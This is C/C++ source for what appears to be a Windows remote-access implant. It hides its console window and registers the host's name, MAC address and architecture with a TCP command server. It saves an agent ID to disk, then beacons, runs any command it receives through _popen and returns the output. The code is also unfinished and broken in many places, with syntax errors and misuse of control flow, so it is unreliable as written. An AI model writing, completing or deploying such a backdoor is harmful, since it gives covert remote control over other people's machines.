#include <winsock2.h>
#include <windows.h>
#include <stdbool.h>
#include <stdio.h>
#include <cjson/cJSON.h>
#include <fcntl.h>

#pragma comment(lib, "ws2_32.lib")
//#pragma comment(lib, "Secur32.lib")

#define PORT 9999
#define ADDR "127.0.0.1"
#define file_path "C:\\temp\\id"
#define BUFFER_SIZE 4096
#define MAX_RESPONSE 20000


class Communicate_ {
    private:
    int sock;
    public:
    int conn();
    void register(Device d);
    void beacon(char *id);
};

class Device {
    public:
    void hideConsole();
    char* get_hostname();
    char* get_MAC();
    char* get_Arch();
};

int main() {
    Communicate_ comm;
    Device d;
    d.hideConsole()
    while (1) {
        if (comm.conn() == -1) {
            sleep(300); // use random for 
            continue;
        }
        int file = open(file_path, O_RDONLY);
        if (file == -1) {
            comm.register();
            sleep(300);
            continue;
        }
        char id[BUFFER_SIZE];
        read(file, id, sizeof(id));
        // check if agent_id file exists
        comm.beacon(id);
        sleep(4000);
    }

    return 0;
}



Communicate_::conn() {
    WSADATA wsaData;
    struct sockaddr_in serverAddress;
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(PORT);
    serverAddress.sin_addr.s_addr = inet_addr(ADDR);

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return -1;
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return -1;
    }
    start_connect:
    if (connect(sock, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
        Sleep(30);
        goto start_connect;
    }
    return 0;
}


Device::hideConsole() {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}

Communicate_::beacon(const char *id) {
    cJSON *bea = cJSON_CreateObject();
    cJSON_AddStringToObject(bea, "mode", "beacon");
    cJSON_AddStringToObject(bea, "agent_id", id);
    char *data = cJSON_Print(bea);
    send(sock, data, strlen(data), 0);
    free(data);
    cJSON_Delete(bea);

    char buffer[BUFFER_SIZE];
    int bytes = recv(sock, buffer, sizeof(buffer), 0);
    if (bytes <= 0) {
        continue;
    }
    cJSON *reply = cJSON_Parse(buffer);
    cJSON *mode = cJSON_GetObjectItem(reply, "mode");
    if (strncmp(mode->valuestring, "none", 4) == 0) {
        return;
    }  

    cJSON *task_id = cJSON_GetObjectItem(reply, "task_id");
    cJSON *cmd = cJSON_GetObjectItem(reply, "command");

    // execute command
    // char *result = exec(cmd->valuestring);
    FILE *exec;
    char result[MAX_RESPONSE];
    char buffer[BUFFER_SIZE];

    exec = _popen(cmd->valuestring, "r");
    if (!exec) {
        strcpy(result, "Failed to execute command.\n");
        goto SEND_RESULT;
    }

    while (fgets(buffer, sizeof(buffer), exec) != NULL) {
        strcat(result, buffer);
    }

    SEND_RESULT:
    send(sock, result, strlen(result), 0);
    fclose(exec);
    //
}

Communicate_::register(Device d) {
    cJSON *reg = cJSON_CreateObject();
    cJSON_AddStringToObject(reg, "mode", "register");
    cJSON_AddStringToObject(reg, "os", "windows");
    cJSON_AddStringToObject(reg, "mac", d.get_MAC());
    cJSON_AddStringToObject(reg, "hostname" d.get_hostname());
    cJSON_AddStringToObject(reg, "arch" d.get_Arch());
    // send to server
    char *data = cJSON_Print(reg);
    send(sock, data, strlen(data), 0);
    free(data);
    cJSON_Delete(reg);

    char buffer[BUFFER_SIZE];
    int bytes = recv(sock, buffer, sizeof(buffer), 0);
    if (bytes <= 0) {
        continue;
    }
    cJSON *reply = cJSON_Parse(buffer);
    cJSON *id = cJSON_GetObjectItem(reply, "agent_id");

    // store id in a file
    // file path
    STORE_ID;
    
    FILE *f = fopen(file_path, "w");
    if (!f) {
        sleep(3000);
        goto STORE_ID;
    }

    fwrite(id->valuestring, sizeof(id->valuestring), f);
    fclose(f);
    cJSON_Delete(reply);
}
